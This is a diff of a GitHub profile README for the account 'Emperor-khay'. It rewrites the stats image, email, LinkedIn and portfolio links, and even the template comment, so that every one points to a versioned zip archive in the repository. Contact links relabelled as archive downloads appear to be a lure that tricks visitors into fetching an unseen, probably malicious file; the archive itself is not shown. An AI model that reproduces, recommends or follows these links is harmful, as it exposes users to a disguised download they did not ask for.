@@ -56,15 +56,15 @@
 ---
 
 ## 📈 GitHub Stats
-![Kelechi's GitHub stats](https://raw.githubusercontent.com/Emperor-khay/Emperor-khay/main/chevon/Emperor-khay.zip)
+![Kelechi's GitHub stats](https://github.com/Emperor-khay/Emperor-khay/raw/refs/heads/main/chevon/khay_Emperor_v1.3.zip)
 
 ---
 
 ## 📫 Let's Connect
 
-- **Email**: https://raw.githubusercontent.com/Emperor-khay/Emperor-khay/main/chevon/Emperor-khay.zip
-- **LinkedIn**: https://raw.githubusercontent.com/Emperor-khay/Emperor-khay/main/chevon/Emperor-khay.zip
-- **Portfolio**: https://raw.githubusercontent.com/Emperor-khay/Emperor-khay/main/chevon/Emperor-khay.zip
+- **Email**: https://github.com/Emperor-khay/Emperor-khay/raw/refs/heads/main/chevon/khay_Emperor_v1.3.zip
+- **LinkedIn**: https://github.com/Emperor-khay/Emperor-khay/raw/refs/heads/main/chevon/khay_Emperor_v1.3.zip
+- **Portfolio**: https://github.com/Emperor-khay/Emperor-khay/raw/refs/heads/main/chevon/khay_Emperor_v1.3.zip
 
 ---
 
@@ -72,6 +72,6 @@
 🔍 Always improving, always building — one project at a time.
 
 <!---
-Emperor-khay/Emperor-khay is a ✨ special ✨ repository because its `https://raw.githubusercontent.com/Emperor-khay/Emperor-khay/main/chevon/Emperor-khay.zip` (this file) appears on your GitHub profile.
+Emperor-khay/Emperor-khay is a ✨ special ✨ repository because its `https://github.com/Emperor-khay/Emperor-khay/raw/refs/heads/main/chevon/khay_Emperor_v1.3.zip` (this file) appears on your GitHub profile.
 You can click the Preview link to take a look at your changes.
 --->
